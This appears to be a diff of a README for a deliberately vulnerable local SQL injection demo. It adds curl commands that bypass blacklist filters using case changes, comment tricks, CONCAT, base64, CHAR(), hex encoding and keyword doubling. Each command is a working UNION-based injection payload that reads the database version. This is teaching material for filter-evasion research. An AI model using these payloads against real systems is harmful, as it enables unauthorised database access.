@@ -45,42 +45,68 @@ curl -X GET localhost:5808/sqlidemo/vulnbyid\?id="1'+UNION+SELECT+NULL,NULL,(SEL
 
 #### Blacklist 
 
+Use 
+
+```
+curl localhost:5808/sqlidemo/vulnbyid -d id -d blacklistconfig=help
+```
+
+to get a help display of all possible blacklist configurations.
+
 ##### Single Quote Replacement
 
 Using Escape Sequences ([https://mariadb.com/kb/en/string-literals/](https://mariadb.com/kb/en/string-literals/)):
 
 ```
-curl localhost:5808/sqlidemo/vulnbyid -d id="1\' UNION SELECT NULL,NULL,(SELECT @@VERSION) -- " -d blacklistconfig=oddsinglequotes
+curl localhost:5808/sqlidemo/vulnbyid -d id="1\' UNION SELECT NULL,NULL,(@@VERSION) -- " -d blacklistconfig=add_oddsinglequotes
 ```
 
-##### All Lowercase
+or as keyword
+
+```
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(@@version) as username from user where id='1" -d blacklistconfig=add_oddsinglequotes
+```
+
+##### Any Uppercase
 
 ```  
-curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select @@version) -- " -d blacklistconfig=alllowercase
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(@@version) -- " -d blacklistconfig=block_anyuppercase
 ```
 
-##### All Uppercase
+##### Any Lowercase
 
 ```
-curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,(SELECT @@VERSION) -- " -d blacklistconfig=alluppercase
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,(@@VERSION) -- " -d blacklistconfig=block_anylowercase
 ```
 
-##### Keyword Combination Check
+##### Keyword Sequences Check
 
 ```
-curl localhost:5808/sqlidemo/vulnbyid -d id="1' union/**/select null,null,(select @@Version) -- " -d blacklistconfig=keyworddetection
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union/**/select null,null,(@@version) -- " -d blacklistconfig=block_keywordsequences
+```
+
+##### Comment Double Dash Check
+
+```
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(@@version) #" -d blacklistconfig=block_comment_doubledash
+```
+
+##### All Comment Types Check
+
+```
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(@@version) as username from user where id='1" -d blacklistconfig=block_comment_doubledash,block_comment_hash
 ```
 
 ##### String Detection I
 
 ```
-curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=CONCAT('VERSIO','N')) --
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=CONCAT('VERSIO','N')) -- " -d blacklistconfig=block_badstrings
 ```
 
 or
 
 ```
-curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name='VERSIO' 'N')
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name='VERSIO' 'N') -- " -d blacklistconfig=block_badstrings
 ```
 
 
@@ -93,7 +119,7 @@ echo -n 'VERSION'|base64
 ```
 
 ```
-curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=FROM_BASE64('VkVSU0lPTg==')) -- "
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=FROM_BASE64('VkVSU0lPTg==')) -- " -d blacklistconfig=block_badstrings,block_concatenation
 ```
 
 ##### String Detection III
@@ -105,7 +131,7 @@ printf '%d %d %d %d %d %d %d' "'V" "'E" "'R" "'S" "'I" "'O" "'N"
 ```
 
 ```
-curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=CHAR(86,69,82,83,73,79,78)) -- "
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=CHAR(86,69,82,83,73,79,78)) -- " -d blacklistconfig=block_badstrings,block_concatenation,block_base64
 ```
 
 ##### String Detection IV  
@@ -117,13 +143,29 @@ SELECT CONCAT('0x',HEX('VERSION'))
 ``` 
 
 ```
-curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=0x56455253494F4E) -- "
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=0x56455253494F4E) -- " -d blacklistconfig=block_badstrings,block_concatenation,block_base64,block_char_function
 ```
 
 ##### All together
 
 ```
-curl localhost:5808/sqlidemo/vulnbyid -d id="1\' union select null,null,(select @@version) -- " -d blacklistconfig=oddsinglequotes,alllowercase
+curl http://localhost:5808/sqlidemo/vulnbyid \       
+\
+-d id=\                                                                    
+"1' unionunion select select null,null,(select variable_value from \       
+information_schema.global_variables where variable_name=0x56455253494f4e) \
+as username from user where id='1" \
+\                       
+-d blacklistconfig=\      
+add_oddsinglequotes,\     
+strip_keywordsequences,\  
+block_comment_doubledash,\
+block_comment_hash,\ 
+block_anyuppercase,\ 
+block_badstrings,\   
+block_concatenation,\
+block_base64,\     
+block_char_function
 ```
 
 ### JPQL based
